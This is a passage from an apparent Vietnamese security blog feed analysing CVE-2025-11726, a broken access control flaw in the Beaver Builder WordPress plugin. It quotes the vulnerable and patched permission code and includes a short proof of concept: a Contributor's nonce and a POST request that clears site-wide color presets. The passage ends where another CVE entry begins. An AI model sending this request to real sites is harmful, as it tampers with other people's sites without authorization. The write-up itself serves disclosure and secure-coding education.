0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Trong phiên bản lỗi (v2.9.4):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;static public function register_rest_endpoints() {&#xA;    ...&#xA;    register_rest_route( &amp;#39;fl-controls/v1&amp;#39;, &amp;#39;/color_presets/&amp;#39;, array(&#xA;        &amp;#39;methods&amp;#39;             =&amp;gt; WP_REST_Server::CREATABLE,&#xA;        &amp;#39;callback&amp;#39;            =&amp;gt; __CLASS__ . &amp;#39;::set_color_presets&amp;#39;,&#xA;        &amp;#39;permission_callback&amp;#39; =&amp;gt; __CLASS__ . &amp;#39;::check_permission&amp;#39;,&#xA;    ) );&#xA;&#xA;    register_rest_route( &amp;#39;fl-controls/v1&amp;#39;, &amp;#39;/color_presets/&amp;#39;, array(&#xA;        &amp;#39;methods&amp;#39;             =&amp;gt; WP_REST_Server::DELETABLE,&#xA;        &amp;#39;callback&amp;#39;            =&amp;gt; __CLASS__ . &amp;#39;::delete_color_presets&amp;#39;,&#xA;        &amp;#39;permission_callback&amp;#39; =&amp;gt; __CLASS__ . &amp;#39;::check_permission&amp;#39;,&#xA;    ) );&#xA;&#xA;    register_rest_route( &amp;#39;fl-controls/v1&amp;#39;, &amp;#39;/background_presets/&amp;#39;, array(&#xA;        &amp;#39;methods&amp;#39;             =&amp;gt; WP_REST_Server::CREATABLE,&#xA;        &amp;#39;callback&amp;#39;            =&amp;gt; __CLASS__ . &amp;#39;::set_background_presets&amp;#39;,&#xA;        &amp;#39;permission_callback&amp;#39; =&amp;gt; __CLASS__ . &amp;#39;::check_permission&amp;#39;,&#xA;    ) );&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Plugin đã đăng ký một &lt;strong&gt;REST API endpoints&lt;/strong&gt; thuộc namespace &lt;strong&gt;&lt;code&gt;fl-controls/v1&lt;/code&gt;&lt;/strong&gt;, có thể &lt;strong&gt;add, modify hoặc delete&lt;/strong&gt; các &lt;strong&gt;global color presets&lt;/strong&gt; và &lt;strong&gt;background presets&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Các API này kiểm soát truy cập thông qua callback &lt;code&gt;check_permission&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;static public function check_permission() {&#xA;    return FLBuilderUserAccess::current_user_can( &amp;#39;builder_access&amp;#39; );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Plugin đã custom một hàm &lt;code&gt;current_user_can&lt;/code&gt; riêng và sử dụng kiểm tra quyền &lt;code&gt;builder_access&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function register_default_settings() {&#xA;    self::register_setting( &amp;#39;builder_access&amp;#39;, array(&#xA;        &amp;#39;default&amp;#39;     =&amp;gt; &amp;#39;all&amp;#39;,&#xA;        &amp;#39;group&amp;#39;       =&amp;gt; __( &amp;#39;Frontend&amp;#39;, &amp;#39;fl-builder&amp;#39; ),&#xA;        &amp;#39;label&amp;#39;       =&amp;gt; __( &amp;#39;Builder Access&amp;#39;, &amp;#39;fl-builder&amp;#39; ),&#xA;        &amp;#39;description&amp;#39; =&amp;gt; __( &amp;#39;The selected roles will have access to the builder for editing posts, pages, and CPTs.&amp;#39;, &amp;#39;fl-builder&amp;#39; ),&#xA;        &amp;#39;order&amp;#39;       =&amp;gt; &amp;#39;1&amp;#39;,&#xA;    ) );&#xA;&#xA;    self::register_setting( &amp;#39;unrestricted_editing&amp;#39;, array(&#xA;        &amp;#39;default&amp;#39;     =&amp;gt; &amp;#39;all&amp;#39;,&#xA;        &amp;#39;group&amp;#39;       =&amp;gt; __( &amp;#39;Frontend&amp;#39;, &amp;#39;fl-builder&amp;#39; ),&#xA;        &amp;#39;label&amp;#39;       =&amp;gt; __( &amp;#39;Unrestricted Editing&amp;#39;, &amp;#39;fl-builder&amp;#39; ),&#xA;        &amp;#39;description&amp;#39; =&amp;gt; __( &amp;#39;The selected roles will have unrestricted access to all editing features within the builder.&amp;#39;, &amp;#39;fl-builder&amp;#39; ),&#xA;        &amp;#39;order&amp;#39;       =&amp;gt; &amp;#39;2&amp;#39;,&#xA;    ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;builder_access&lt;/code&gt; được đăng ký thông qua hàm &lt;code&gt;register_setting&lt;/code&gt; với &lt;code&gt;&#39;default&#39; =&amp;gt; &#39;all&#39;&lt;/code&gt; tức là dành cho tất cả các user.&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition question open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-regular fa-circle-question&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Câu hỏi&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;&lt;code&gt;builder_access&lt;/code&gt;: Dành cho tất cả các user thì tại sao lỗ hổng được công bố với đặc quyền Contributor?&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;Câu trả lời nằm trong logic của hàm &lt;code&gt;current_user_can&lt;/code&gt; của plugin:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;static public function current_user_can( $key ) {&#xA;    $user     = wp_get_current_user();&#xA;    $settings = self::get_saved_settings();&#xA;&#xA;    // Return false if no settings saved.&#xA;    if ( ! isset( $settings[ $key ] ) ) {&#xA;        return false;&#xA;    }&#xA;&#xA;    // Make sure super admins have administrator access.&#xA;    if ( is_multisite() &amp;amp;&amp;amp; is_super_admin() &amp;amp;&amp;amp; ! in_array( &amp;#39;administrator&amp;#39;, $user-&amp;gt;roles ) ) {&#xA;        $user-&amp;gt;roles[] = &amp;#39;administrator&amp;#39;;&#xA;    }&#xA;&#xA;    // Check the user&amp;#39;s roles against the saved settings.&#xA;    foreach ( $user-&amp;gt;roles as $role ) {&#xA;&#xA;        // Return true if the user has access.&#xA;        if ( isset( $settings[ $key ][ $role ] ) &amp;amp;&amp;amp; $settings[ $key ][ $role ] ) {&#xA;            return true;&#xA;        }&#xA;    }&#xA;&#xA;    return false;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;current_user_can&lt;/code&gt; kiểm tra quyền dựa trên &lt;strong&gt;role + plugin settings&lt;/strong&gt;, không dựa trên capability chuẩn của WordPress. Hàm sẽ gọi đến &lt;code&gt; self::get_saved_settings()&lt;/code&gt; để lấy các setting:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;static public function get_saved_settings() {&#xA;    if ( self::$settings ) {&#xA;        return self::$settings;&#xA;    }&#xA;&#xA;    $roles       = self::get_all_roles();&#xA;    $settings    = FLBuilderModel::get_admin_settings_option( &amp;#39;_fl_builder_user_access&amp;#39;, true );&#xA;    $ms_settings = FLBuilderModel::get_admin_settings_option( &amp;#39;_fl_builder_user_access&amp;#39;, false );&#xA;    $ms_support  = FLBuilderAdminSettings::multisite_support();&#xA;&#xA;    if ( ! is_array( $settings ) ) {&#xA;        $settings = array();&#xA;    }&#xA;&#xA;    foreach ( self::$registered_settings as $key =&amp;gt; $data ) {&#xA;&#xA;        if ( ! isset( $settings[ $key ] ) ) {&#xA;            if ( $ms_support &amp;amp;&amp;amp; isset( $ms_settings[ $key ] ) ) {&#xA;                $settings[ $key ] = $ms_settings[ $key ];&#xA;            } else {&#xA;                $settings[ $key ] = array();&#xA;            }&#xA;        }&#xA;&#xA;        foreach ( $roles as $role_key =&amp;gt; $role_data ) {&#xA;&#xA;            if ( ! isset( $settings[ $key ][ $role_key ] ) ) {&#xA;&#xA;                if ( ! isset( $data[&amp;#39;default&amp;#39;] ) || ! $data[&amp;#39;default&amp;#39;] ) {&#xA;                    $settings[ $key ][ $role_key ] = false;&#xA;                } elseif ( is_array( $data[&amp;#39;default&amp;#39;] ) ) {&#xA;&#xA;                    if ( in_array( $role_key, $data[&amp;#39;default&amp;#39;] ) ) {&#xA;                        $settings[ $key ][ $role_key ] = true;&#xA;                    } else {&#xA;                        $settings[ $key ][ $role_key ] = false;&#xA;                    }&#xA;                } else {&#xA;                    $settings[ $key ][ $role_key ] = true;&#xA;                }&#xA;            }&#xA;        }&#xA;    }&#xA;&#xA;    self::$settings = $settings;&#xA;&#xA;    return $settings;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;get_saved_settings&lt;/code&gt; có nhiệm vụ lấy và chuẩn hoá cấu hình phân quyền theo role từ option &lt;code&gt;_fl_builder_user_access&lt;/code&gt;, áp dụng giá trị mặc định (&lt;code&gt;default&lt;/code&gt;) cho từng &lt;code&gt;$key&lt;/code&gt; và từng &lt;code&gt;role&lt;/code&gt;, rồi cache vào &lt;code&gt;self::$settings&lt;/code&gt;. Roles được lấy thông qua việc gọi hàm &lt;code&gt;self::get_all_roles()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;static public function get_all_roles() {&#xA;    if ( ! function_exists( &amp;#39;get_editable_roles&amp;#39; ) ) {&#xA;        require_once ABSPATH . &amp;#39;wp-admin/includes/user.php&amp;#39;;&#xA;    }&#xA;&#xA;    $editable_roles = get_editable_roles();&#xA;    $roles          = array();&#xA;    $caps           = apply_filters( &amp;#39;fl_builder_user_access_capabilities&amp;#39;, array( &amp;#39;edit_posts&amp;#39; ) );&#xA;&#xA;    foreach ( $editable_roles as $role =&amp;gt; $data ) {&#xA;        foreach ( $caps as $cap ) {&#xA;            if ( isset( $data[&amp;#39;capabilities&amp;#39;][ $cap ] ) &amp;amp;&amp;amp; 1 == $data[&amp;#39;capabilities&amp;#39;][ $cap ] ) {&#xA;                $roles[ $role ] = $data[&amp;#39;name&amp;#39;];&#xA;            }&#xA;        }&#xA;    }&#xA;&#xA;    return $roles;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;get_all_roles()&lt;/code&gt; trả về danh sách các &lt;strong&gt;role có capability nhất định&lt;/strong&gt;, mặc định là &lt;code&gt;edit_posts&lt;/code&gt; — tức là thực tế bao gồm các role từ &lt;strong&gt;Contributor trở lên&lt;/strong&gt;. &lt;mark class=&#34;mark-default&#34;&gt;Đây chính là câu trả lời&lt;/mark&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Bản vá (v2.9.4.1):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;Thay &lt;code&gt;check_permission&lt;/code&gt; bằng &lt;code&gt;check_write_permission&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-07-cve-2025-11726/diff1.png&#34; title=&#34;Sử dụng check_write_permission thay cho check_permission&#34; data-thumbnail=&#34;/posts/2025-12-07-cve-2025-11726/diff1.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff1&lt;/h2&gt;&lt;p&gt;Sử dụng check_write_permission thay cho check_permission&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-07-cve-2025-11726/diff1.png&#39; alt=&#34;Diff1&#34; height=&#34;625&#34; width=&#34;1832&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Sử dụng check_write_permission thay cho check_permission&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Yêu cầu đồng thời hai quyền nội bộ của plugin: &lt;code&gt;unrestricted_editing&lt;/code&gt; và &lt;code&gt;builder_access&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;static public function check_write_permission() {&#xA;    return ( FLBuilderUserAccess::current_user_can( &amp;#39;unrestricted_editing&amp;#39; ) &amp;amp;&amp;amp; FLBuilderUserAccess::current_user_can( &amp;#39;builder_access&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hai quyền này được sửa lại, chỉ dành cho &lt;code&gt;administrator&lt;/code&gt; và &lt;code&gt;editor&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-07-cve-2025-11726/diff2.png&#34; title=&#34;Thay đổi quyền&#34; data-thumbnail=&#34;/posts/2025-12-07-cve-2025-11726/diff2.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff2&lt;/h2&gt;&lt;p&gt;Thay đổi quyền&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-07-cve-2025-11726/diff2.png&#39; alt=&#34;Diff2&#34; height=&#34;341&#34; width=&#34;1748&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Thay đổi quyền&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;&lt;strong&gt;Các callback tương ứng với các endpoint:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;static public function set_color_presets( $request ) {&#xA;    $color_presets = (array) get_option( &amp;#39;_fl_builder_color_presets&amp;#39;, [] );&#xA;    $params        = $request-&amp;gt;get_params();&#xA;&#xA;    if ( isset( $params[&amp;#39;clearPresets&amp;#39;] ) &amp;amp;&amp;amp; true === $params[&amp;#39;clearPresets&amp;#39;] ) {&#xA;        if ( update_option( &amp;#39;_fl_builder_color_presets&amp;#39;, [] ) ) {&#xA;            return new WP_REST_Response( [&#xA;                &amp;#39;presets&amp;#39; =&amp;gt; [],&#xA;            ], 200 );&#xA;        }&#xA;    }&#xA;&#xA;    // Dedupe the merged arrays&#xA;    $new_presets = array_unique( array_merge( $color_presets, $params[&amp;#39;addPresets&amp;#39;] ) );&#xA;&#xA;    update_option( &amp;#39;_fl_builder_color_presets&amp;#39;, $new_presets );&#xA;&#xA;    return new WP_REST_Response( [&#xA;        &amp;#39;presets&amp;#39; =&amp;gt; $new_presets,&#xA;    ], 200 );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;static public function delete_color_presets( $request ) {&#xA;    $color_presets = (array) get_option( &amp;#39;_fl_builder_color_presets&amp;#39;, [] );&#xA;    $params        = $request-&amp;gt;get_params();&#xA;&#xA;    $new_presets = array_values( array_filter( $color_presets, function ( $color ) use ( $params ) {&#xA;&#xA;        // Check for exact match and value w/ # prepended&#xA;        return ! in_array( $color, $params[&amp;#39;deletePresets&amp;#39;] ) &amp;amp;&amp;amp; ! in_array( &amp;#39;#&amp;#39; . $color, $params[&amp;#39;deletePresets&amp;#39;] );&#xA;    } ) );&#xA;&#xA;    if ( update_option( &amp;#39;_fl_builder_color_presets&amp;#39;, $new_presets ) ) {&#xA;        $color_presets = $new_presets;&#xA;    }&#xA;&#xA;    return new WP_REST_Response( [&#xA;        &amp;#39;presets&amp;#39; =&amp;gt; $color_presets,&#xA;    ], 200 );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;static public function set_background_presets( $request ) {&#xA;    $presets     = (array) get_option( &amp;#39;_fl_builder_color_presets&amp;#39;, [] );&#xA;    $params      = $request-&amp;gt;get_params();&#xA;    $new_presets = array_merge( $presets, $params[&amp;#39;addPresets&amp;#39;] );&#xA;&#xA;    if ( update_option( &amp;#39;_fl_builder_background_presets&amp;#39;, $new_presets ) ) {&#xA;        $presets = $new_presets;&#xA;    }&#xA;&#xA;    return new WP_REST_Response( [&#xA;        &amp;#39;presets&amp;#39; =&amp;gt; $presets,&#xA;    ], 200 );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;Authenticated user (Contributor or higher)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Sends request to /wp-json/fl-controls/v1/*&amp;#34;]&#xA;--&amp;gt; C[&amp;#34;REST API calls permission_callback = check_permission()&amp;#34;]&#xA;--&amp;gt; D[&amp;#34;check_permission() → current_user_can(&amp;#39;builder_access&amp;#39;)&amp;#34;]&#xA;--&amp;gt; G[&amp;#34;builder_access = true for Contributor&amp;#34;]&#xA;--&amp;gt; H[&amp;#34;Request is accepted&amp;#34;]&#xA;--&amp;gt; I[&amp;#34;set_color_presets / delete_color_presets / set_background_presets&amp;#34;]&#xA;--&amp;gt; J[&amp;#34;Global Presets are added / modified / deleted site-wide&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Login Contributor account:&lt;/li&gt;&#xA;&lt;li&gt;Lấy nonce bằng cách dán nội dung sau vào browser console:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;wpApiSettings.nonce&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Thêm X-WP-Nonce header và gửi request:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/fl-controls/v1/color_presets/ HTTP/1.1&#xA;Cookie: contributor_cookie&#xA;X-WP-Nonce: 0db9546893&#xA;&#xA;{&#xA;  &amp;#34;clearPresets&amp;#34;: true&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Làm tương tự cho các endpoint còn lại.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-11726 là lỗi &lt;strong&gt;Broken Access Control&lt;/strong&gt; xuất phát từ việc plugin chỉ kiểm tra quyền nội bộ &lt;code&gt;builder_access&lt;/code&gt; — quyền này mặc định áp dụng cho các role có &lt;code&gt;edit_posts&lt;/code&gt; (tức &lt;strong&gt;Contributor trở lên&lt;/strong&gt;). Vì vậy, chỉ cần đăng nhập, attacker đã có thể &lt;strong&gt;thêm, sửa, xoá Global Presets&lt;/strong&gt; thông qua REST API &lt;code&gt;fl-controls/v1&lt;/code&gt;, ảnh hưởng toàn bộ nội dung Beaver Builder trên site.&lt;/p&gt;&#xA;&lt;p&gt;Bản vá &lt;strong&gt;v2.9.4.1&lt;/strong&gt; đã khắc phục bằng cách thay &lt;code&gt;check_permission&lt;/code&gt; bằng &lt;code&gt;check_write_permission&lt;/code&gt;, yêu cầu &lt;strong&gt;đồng thời&lt;/strong&gt; &lt;code&gt;builder_access&lt;/code&gt; và &lt;code&gt;unrestricted_editing&lt;/code&gt;, đồng thời giới hạn về &lt;strong&gt;Editor và Administrator&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Có xác thực ≠ có đủ quyền (Authentication ≠ Authorization)&lt;/li&gt;&#xA;&lt;li&gt;Không nên dùng &lt;strong&gt;default = all&lt;/strong&gt; cho quyền nhạy cảm&lt;/li&gt;&#xA;&lt;li&gt;Custom permissions phải map đúng với &lt;strong&gt;WordPress core capabilities&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Endpoint thay đổi &lt;strong&gt;global settings&lt;/strong&gt; phải yêu cầu quyền cao (Admin/Editor)&lt;/li&gt;&#xA;&lt;li&gt;So sánh (diff) giữa bản lỗi và bản vá là cách nhanh để phát hiện lỗi logic phân quyền&lt;/li&gt;&#xA;&lt;li&gt;Cần nhiều lớp kiểm tra quyền cho các hành động quan trọng&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/broken-access-control/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Broken Access Control&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/beaver-builder-lite-version/vulnerability/wordpress-beaver-builder-wordpress-page-builder-plugin-2-9-4-missing-authorization-to-authenticated-contributor-global-preset-modification-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Beaver Builder Plugin &amp;lt;= 2.9.4 is vulnerable to Broken Access Control&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2024-11600 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-06-cve-2024-11600/</link>
      <pubDate>Sat, 06 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-06-cve-2024-11600/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-06-cve-2024-11600/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 